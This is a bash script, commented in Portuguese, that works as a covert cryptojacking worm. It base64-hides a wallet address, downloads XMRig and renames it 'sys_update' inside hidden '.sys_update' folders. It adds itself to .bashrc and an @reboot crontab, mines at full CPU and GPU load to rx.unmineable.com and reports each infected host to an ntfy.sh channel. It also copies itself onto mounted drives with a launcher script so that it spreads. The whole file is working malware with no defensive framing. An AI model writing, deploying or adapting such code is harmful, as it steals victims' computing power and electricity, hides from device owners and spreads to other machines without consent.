#!/bin/bash
B64="MHg3ZDBCMDI5Zjk2MzQ4ODk2RWRhQzMxOTgwMTQ5Njg2MWM4ODhiQTE0"
WALLET=$(echo "$B64" | base64 -d)
# Configuração Ntfy.sh
NTFY_URL="https://ntfy.sh/gsgzs"
START_TIME=$(date +%s)

function send_checkin() {
    local status="$1"
    local mode="$2"
    local now=$(date +%s)
    local uptime_sec=$((now - START_TIME))
    local uptime_str=$(printf '%dd %dh %dm' $((uptime_sec/86400)) $((uptime_sec%86400/3600)) $((uptime_sec%3600/60)))
    
    local msg="💻 Host: $(hostname)\n🛠 Status: $status\n📈 Modo: $mode\n⏱ Uptime: $uptime_str\n📅 Data: $(date '+%d/%m/%Y %H:%M:%S')"
    
    curl -H "Title: Minerador Status (Linux)" \
         -H "Priority: default" \
         -H "Tags: hammer,tux" \
         -d "$msg" "$NTFY_URL" > /dev/null 2>&1
}

ARCH=$(uname -m)
IS_TERMUX=$(echo $HOME | grep -q "com.termux" && echo "true" || echo "false")
IS_ADB_ANDROID=$(uname -a | grep -i "android" && echo "true" || echo "false")
IS_NATIVE_APP=${IS_NATIVE_APP:-"false"}

if [ "$EUID" -eq 0 ]; then
    echo 128 > /proc/sys/vm/nr_hugepages 2>/dev/null
fi

if [ "$IS_NATIVE_APP" = "true" ]; then
    TMP_BASE="$APP_FILES_DIR/.sys_update"
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
elif [ "$IS_TERMUX" = "true" ]; then
    TMP_BASE="$HOME/.sys_update"
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-android-arm64.tar.gz"
    if ! grep -q "miner.sh" "$HOME/.bashrc" 2>/dev/null; then
        echo "bash $HOME/miner.sh > /dev/null 2>&1 &" >> "$HOME/.bashrc"
    fi
elif [ "$IS_ADB_ANDROID" = "true" ]; then
    TMP_BASE="/data/local/tmp/.sys_update"
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
else
    TMP_BASE="/tmp/.sys_update"
    (crontab -l 2>/dev/null | grep -v "miner.sh"; echo "@reboot bash $(realpath "$0") > /dev/null 2>&1 &") | crontab -
    if [[ "$ARCH" == "x86_64" ]]; then
        URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
    else
        URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
    fi
fi

BIN_DIR="$TMP_BASE/bin"
LOG_FILE="$TMP_BASE/sys_log.txt"
if [ ! -d "$BIN_DIR" ]; then
    mkdir -p "$BIN_DIR"
    curl -L "$URL" -o "$TMP_BASE/pkg.tar.gz" > /dev/null 2>&1
    tar -xzf "$TMP_BASE/pkg.tar.gz" -C "$BIN_DIR" > /dev/null 2>&1
    rm "$TMP_BASE/pkg.tar.gz"
fi

XMRIG_BIN=$(find "$BIN_DIR" -name xmrig -type f | head -n 1)
NEW_BIN="$BIN_DIR/sys_update"
if [ -f "$XMRIG_BIN" ] && [ ! -f "$NEW_BIN" ]; then
    mv "$XMRIG_BIN" "$NEW_BIN"
fi

if [ -f "$NEW_BIN" ]; then
    chmod +x "$NEW_BIN"
    if ! pgrep -x "sys_update" > /dev/null; then
        send_checkin "Iniciado" "Full Power"
        nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file "$LOG_FILE" > /dev/null 2>&1 &
    fi
fi

if [[ "$IS_TERMUX" == "false" && "$IS_ADB_ANDROID" == "false" ]]; then
    (while true; do
        for drive in /media/$USER/* /mnt/*; do
            if [ -d "$drive" ] && [ ! -d "$drive/SystemUpdate" ]; then
                mkdir -p "$drive/SystemUpdate"
                cp -r "$(dirname "$0")/"* "$drive/SystemUpdate/"
                echo "bash \$HOME/SystemUpdate/miner.sh &" > "$drive/iniciar.sh"
                chmod +x "$drive/iniciar.sh"
            fi
        done
        sleep 60
    done) &
fi